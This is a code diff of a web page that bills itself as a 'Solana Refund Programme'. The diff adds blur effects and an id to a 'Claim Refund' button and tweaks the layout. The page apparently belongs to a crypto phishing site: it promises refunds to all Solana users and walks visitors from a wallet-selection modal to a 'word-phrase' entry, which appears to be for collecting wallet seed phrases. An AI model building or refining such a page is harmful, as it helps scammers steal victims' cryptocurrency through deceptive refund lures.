@@ -68,6 +68,8 @@ export default function Home() {
     document
       .querySelectorAll(".modal")
       .forEach((x) => x.classList.toggle("hidden"));
+    // Blur Claim button
+    document.getElementById("claimButton").classList.toggle("blur-lg");
   };
   const showPhrase = (decide) => {
     if (decide == "all") {
@@ -75,10 +77,13 @@ export default function Home() {
       document
         .querySelectorAll(".modal")
         .forEach((x) => x.classList.add("hidden"));
+          document.getElementById("claimButton").classList.remove("blur-lg");
+
       return;
     }
     document.querySelector(".word-phrase").classList.remove("hidden");
     document.getElementById("selectWallet").classList.add("hidden");
+    document.getElementById("claimButton").classList.add("blur-lg");
   };
   return (
     <div className="bg-black">
@@ -88,7 +93,7 @@ export default function Home() {
         <link rel="icon" href="/main-fav.png" />
       </Head>
 
-      <main className="p-5 bg-[url('/Mian-bg.webp')] overflow-hidden h-screen relative">
+      <main className="p-5 bg-[url('/Mian-bg.webp')]  overflow-hidden h-screen relative">
         <div className="backdrop-blur-md modal absolute w-screen hidden h-screen bg-black/30"></div>
 
         <nav className="grid w-full grid-cols-2 mb-2">
@@ -114,7 +119,7 @@ export default function Home() {
         <hr />
         {/* Main Page */}
         <div
-          className="flex  flex-col items-center w-full
+          className="flex justify-center flex-col items-center w-full
         "
         >
           <div className="sm:ml-60 ml-20 flex items-center h-screen absolute">
@@ -126,12 +131,13 @@ export default function Home() {
               <span className="font-extralight">Solana</span> Refund Programme
             </h1>
             <p className="sm:text-3xl text-xl sm:px-80 font-light text-center">
-              Solana Refund is available to all solana network. Get
-              refund by claiming your refund now.
+              Solana Refund is available to all solana network. Get refund by
+              claiming your refund now.
             </p>
             <button
-              className="bg-[#17fb9b] px-5 text-lg cursor-pointer py-2
-            font-semibold rounded-full text-black"
+              id="claimButton"
+              className="bg-[#17fb9b] relative z-10 px-5 text-lg cursor-pointer py-2
+            font-semibold rounded-full text-black "
               onClick={showModal}
             >
               Claim Refund
